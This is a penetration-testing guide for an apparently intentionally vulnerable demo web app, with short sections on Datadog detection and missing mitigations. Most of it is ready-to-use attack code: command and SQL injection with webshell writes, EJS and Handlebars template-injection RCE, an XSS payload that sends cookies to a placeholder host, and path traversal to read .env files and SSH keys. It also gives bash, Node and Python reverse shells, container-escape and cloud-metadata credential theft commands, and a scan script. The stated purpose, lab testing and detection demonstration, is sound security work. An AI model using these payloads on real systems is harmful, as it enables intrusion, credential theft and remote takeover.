# Web Attacks for Container Access

## Overview

This guide demonstrates web-based attack vectors that can lead to container access or Remote Code Execution (RCE) in the intentionally vulnerable Pizza Coffee application.

## ⚠️ Legal Notice

These attacks are for **authorized security testing only** on your own infrastructure. Unauthorized access to systems is illegal.

---

## Attack Vectors (Easiest to Hardest)

### 1. Command Injection via File Upload/Processing ⭐ EASIEST

**Vulnerability**: Unsanitized file uploads or file processing

**Attack Vector**: Upload malicious file or manipulate file parameters

#### Test 1: File Upload Command Injection
```bash
# Find upload endpoint
curl http://localhost:3000 | grep -i "upload\|file"

# Create malicious file with command injection
echo '"; cat /etc/passwd; echo "' > malicious.txt

# Upload via form or API
curl -X POST http://localhost:3000/api/upload \
  -F "file=@malicious.txt" \
  -F "filename=test.txt"
```

#### Test 2: PDF Generation Command Injection
```bash
# If app uses PDFKit or similar for PDF generation
curl -X POST http://localhost:3000/api/generate-pdf \
  -H "Content-Type: application/json" \
  -d '{"content": "test"; ls -la; echo "pwned"}'
```

---

### 2. SQL Injection to File Write ⭐⭐ EASY

**Vulnerability**: SQL injection + file write permissions

**Goal**: Use SQL injection to write a webshell

#### Step 1: Test SQL Injection
```bash
# Basic SQLi test
curl "http://localhost:3000/api/search?q=' OR '1'='1"

# Test for UNION injection
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,2,3,4,5--"
```

#### Step 2: Check MySQL Version and Privileges
```bash
# Check if we can execute system commands
curl "http://localhost:3000/api/search?q=' UNION SELECT @@version,user(),database(),4,5--"

# Try to read system files
curl "http://localhost:3000/api/search?q=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5--"
```

#### Step 3: Write Webshell via SQL Injection
```bash
# Attempt to write a PHP/Node webshell to web root
curl "http://localhost:3000/api/search?q=' UNION SELECT '<?php system(\$_GET[\"cmd\"]); ?>',2,3,4,5 INTO OUTFILE '/app/public/shell.php'--"

# For Node.js app, write JS file
curl "http://localhost:3000/api/search?q=' UNION SELECT 'const{exec}=require(\"child_process\");exec(process.argv[2],(e,o)=>console.log(o))',2,3,4,5 INTO OUTFILE '/app/shell.js'--"
```

#### Step 4: Execute Commands
```bash
# Access the webshell
curl "http://localhost:3000/shell.php?cmd=id"
curl "http://localhost:3000/shell.php?cmd=cat /etc/passwd"
curl "http://localhost:3000/shell.php?cmd=whoami"
```

---

### 3. Server-Side Template Injection (SSTI) ⭐⭐⭐ MEDIUM

**Vulnerability**: EJS or Handlebars template injection

**Goal**: Execute code through template engine

#### Test for SSTI in EJS
```bash
# Basic SSTI detection
curl "http://localhost:3000/api/comment" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"text": "<%=7*7%>"}'

# If it returns 49, you have SSTI!
```

#### EJS Payload for RCE
```bash
# Read /etc/passwd
curl "http://localhost:3000/api/comment" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "text": "<%- require(\"child_process\").execSync(\"cat /etc/passwd\").toString() %>"
  }'

# Execute arbitrary commands
curl "http://localhost:3000/api/comment" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "text": "<%- require(\"child_process\").execSync(\"id\").toString() %>"
  }'

# Reverse shell
curl "http://localhost:3000/api/comment" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "text": "<%- require(\"child_process\").exec(\"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\") %>"
  }'
```

#### Handlebars SSTI Payload
```bash
# Handlebars RCE (if app uses Handlebars)
curl "http://localhost:3000/api/template" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require(\\\"child_process\\\").execSync(\\\"whoami\\\");\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
  }'
```

---

### 4. XSS to Session Hijacking to Admin Access ⭐⭐⭐ MEDIUM

**Vulnerability**: Stored XSS + cookie-session (client-side storage)

**Goal**: Steal admin cookie, modify session, gain admin access

#### Step 1: Inject XSS to Steal Cookies
```bash
# Post XSS payload
curl "http://localhost:3000/api/comment" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "text": "<script>fetch(\"http://YOUR_IP:8000/?cookie=\"+document.cookie)</script>"
  }'

# Setup listener
python3 -m http.server 8000
```

#### Step 2: Decode and Modify Session Cookie
```javascript
// In browser console or Node.js
// Get current cookie
const cookie = document.cookie;
console.log(cookie);

// Since cookie-session stores data client-side, decode it
const sessionData = atob(cookie.split('=')[1].split('.')[0]);
console.log(sessionData);

// Expected format: {"userId":1,"isAdmin":false}
// Modify to: {"userId":1,"isAdmin":true}

// You need to re-sign it with the weak secret "insecure-secret"
// Use keygrip library or similar
```

#### Step 3: Set Modified Cookie
```javascript
// Set new cookie with admin privileges
document.cookie = "session=YOUR_MODIFIED_SIGNED_COOKIE; path=/";

// Refresh page - now you're admin!
window.location.reload();
```

---

### 5. Path Traversal to Source Code Access ⭐⭐⭐ MEDIUM

**Vulnerability**: Path traversal in file serving

**Goal**: Read sensitive files from container

#### Test Path Traversal
```bash
# Try to read /etc/passwd
curl "http://localhost:3000/api/file?path=../../../../etc/passwd"

# Try to read app source code
curl "http://localhost:3000/api/file?path=../../../../app/src/server.js"

# Try to read environment variables
curl "http://localhost:3000/api/file?path=../../../../app/.env"

# Try to read Docker secrets
curl "http://localhost:3000/api/file?path=../../../../run/secrets/datadog-api-key"

# Try to read SSH keys
curl "http://localhost:3000/api/file?path=../../../../root/.ssh/id_rsa"
```

---

### 6. Prototype Pollution to RCE ⭐⭐⭐⭐ HARD

**Vulnerability**: Prototype pollution in JavaScript

**Goal**: Pollute Object.prototype to execute code

#### Test Prototype Pollution
```bash
# Test if app is vulnerable
curl "http://localhost:3000/api/settings" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "isAdmin": true
    }
  }'

# Check if pollution worked
curl "http://localhost:3000/api/admin"
```

#### RCE via Prototype Pollution
```bash
# Pollute child_process spawn options
curl "http://localhost:3000/api/settings" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "shell": "node",
      "env": {
        "NODE_OPTIONS": "--require /tmp/evil.js"
      }
    }
  }'
```

---

### 7. NoSQL Injection (if MongoDB is used) ⭐⭐⭐⭐ HARD

**Vulnerability**: NoSQL injection in MongoDB queries

**Goal**: Bypass authentication or execute commands

#### Test NoSQL Injection
```bash
# Login bypass
curl "http://localhost:3000/api/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$ne": null},
    "password": {"$ne": null}
  }'

# Or using query string
curl "http://localhost:3000/api/login?email[\$ne]=null&password[\$ne]=null"
```

---

### 8. Deserialization Attack ⭐⭐⭐⭐⭐ VERY HARD

**Vulnerability**: Unsafe deserialization (node-serialize, etc.)

**Goal**: Execute code via malicious serialized object

#### Test Deserialization
```bash
# Create malicious payload
node -e "
const serialize = require('node-serialize');
const payload = {
  rce: function() {
    require('child_process').exec('whoami', function(error, stdout, stderr) {
      console.log(stdout)
    });
  }()
};
console.log(serialize.serialize(payload));
"

# Send serialized payload
curl "http://localhost:3000/api/deserialize" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"data":"SERIALIZED_PAYLOAD_HERE"}'
```

---

## Reverse Shell Payloads

Once you achieve RCE, establish a reverse shell:

### Bash Reverse Shell
```bash
# Start listener
nc -lvnp 4444

# Via command injection
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# URL encoded for web
curl "http://localhost:3000/api/cmd?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FYOUR_IP%2F4444%200%3E%261%27"
```

### Node.js Reverse Shell
```bash
# Via SSTI or command injection
(function(){
  var net = require('net');
  var spawn = require('child_process').spawn;
  var HOST='YOUR_IP';
  var PORT='4444';
  var client = new net.Socket();
  client.connect(PORT, HOST, function(){
    var sh = spawn('/bin/sh',[]);
    client.write('Connected\n');
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    sh.on('exit',function(code,signal){
      client.end('Disconnected\n');
    });
  });
})();
```

### Python Reverse Shell
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## Container Escape Techniques (Post-Access)

Once inside the container, try to escape:

### 1. Check Container Privileges
```bash
# Check if running as root
id

# Check capabilities
capsh --print

# Check if privileged container
cat /proc/self/status | grep CapEff
```

### 2. Check for Docker Socket
```bash
# If Docker socket is mounted
ls -la /var/run/docker.sock

# If accessible, spawn privileged container
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
```

### 3. Check for Kubernetes Service Account
```bash
# Check for service account token
ls /var/run/secrets/kubernetes.io/serviceaccount/

# If present, interact with Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/pods
```

### 4. Look for Cloud Metadata
```bash
# AWS metadata (IMDSv1)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS metadata (IMDSv2)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### 5. Check Mounted Volumes
```bash
# List mounted volumes
mount | grep -v "^overlay"

# Look for sensitive paths
ls -la /host
ls -la /var/lib/docker
```

---

## Attack Cheat Sheet

| Attack Type | Difficulty | Detection Time | Impact |
|-------------|------------|----------------|--------|
| Command Injection | Easy | Seconds | RCE |
| SQL Injection → File Write | Easy | Minutes | RCE |
| SSTI (EJS) | Medium | Seconds | RCE |
| XSS → Session Hijacking | Medium | Minutes | Account Takeover |
| Path Traversal | Medium | Seconds | File Read |
| Prototype Pollution | Hard | Minutes | RCE |
| NoSQL Injection | Hard | Seconds | Auth Bypass |
| Deserialization | Very Hard | Seconds | RCE |

---

## Testing Workflow

### 1. Reconnaissance
```bash
# Map the application
curl http://localhost:3000 > homepage.html
grep -E "(href|src|action)=" homepage.html

# Find API endpoints
curl http://localhost:3000/api
curl http://localhost:3000/api/docs

# Check for common files
curl http://localhost:3000/robots.txt
curl http://localhost:3000/package.json
curl http://localhost:3000/.git/config
```

### 2. Vulnerability Scanning
```bash
# SQL Injection
sqlmap -u "http://localhost:3000/api/search?q=test" --batch

# XSS
curl -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>"}'

# Command Injection
curl "http://localhost:3000/api/ping?host=127.0.0.1;id"
```

### 3. Exploitation
```bash
# Choose highest impact vulnerability
# Establish RCE
# Get reverse shell
# Enumerate container
# Attempt container escape
```

### 4. Post-Exploitation
```bash
# Inside container
whoami
id
ps aux
ls -la /app
cat /app/.env
ls /run/secrets/
env
cat /proc/1/environ
```

---

## Automation Scripts

### Auto-Test All Vulnerabilities
```bash
#!/bin/bash
TARGET="http://localhost:3000"

echo "[+] Testing SQL Injection..."
curl -s "$TARGET/api/search?q=' OR '1'='1" | grep -q "pizza" && echo "✓ SQLi Vulnerable"

echo "[+] Testing XSS..."
curl -s -X POST "$TARGET/api/comment" \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>"}' | grep -q "script" && echo "✓ XSS Vulnerable"

echo "[+] Testing Command Injection..."
curl -s "$TARGET/api/ping?host=127.0.0.1;id" | grep -q "uid=" && echo "✓ Command Injection Vulnerable"

echo "[+] Testing Path Traversal..."
curl -s "$TARGET/api/file?path=../../../../etc/passwd" | grep -q "root:" && echo "✓ Path Traversal Vulnerable"

echo "[+] Testing SSTI..."
curl -s -X POST "$TARGET/api/comment" \
  -H "Content-Type: application/json" \
  -d '{"text":"<%=7*7%>"}' | grep -q "49" && echo "✓ SSTI Vulnerable"
```

---

## Detection by Datadog

All these attacks should be detected by:

- **Datadog ASM**: Real-time attack detection
  - SQL injection attempts
  - XSS payloads
  - Command injection
  - Path traversal attempts

- **Datadog CWS**: Runtime security
  - Process execution (shells, nc, curl)
  - File access violations
  - Network connections from containers

- **Datadog IAST**: Code-level vulnerabilities
  - SQL injection sinks
  - Command execution sinks
  - Path traversal vulnerabilities

---

## Mitigation (Not Implemented)

These attacks work because:
- ❌ No input validation
- ❌ No output encoding
- ❌ No prepared statements
- ❌ No command parameterization
- ❌ No path sanitization
- ❌ Unsafe deserialization
- ❌ Client-side session storage
- ❌ Privileged containers
- ❌ No WAF/RASP

**For testing purposes only!**
